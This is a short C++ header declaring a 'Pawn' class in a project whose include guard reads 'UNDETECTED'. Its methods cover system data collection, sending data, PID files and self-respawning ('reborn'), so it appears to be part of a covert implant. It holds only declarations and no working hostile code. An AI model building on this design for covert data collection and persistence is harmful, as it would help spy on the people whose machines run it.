//
// Created by nn5h on 7/23/19.
//

#ifndef UNDETECTED_PAWN_H
#define UNDETECTED_PAWN_H

#include "CollectSystemData.h"
#include "NetworkOperations.h"
#include "Helper.h"


class Pawn {
    pid_t currentPID;

public:
    SystemDataCollector systemData;

    Pawn();
    ~Pawn();

    int needReborn();
    int sendMyselfData();
    int readPidFile(std::string fname);
    void reborn();
    void doWork();
    void pidToFile(std::string fname);
    void rmPidFile(std::string fname);

};


#endif //UNDETECTED_PAWN_H
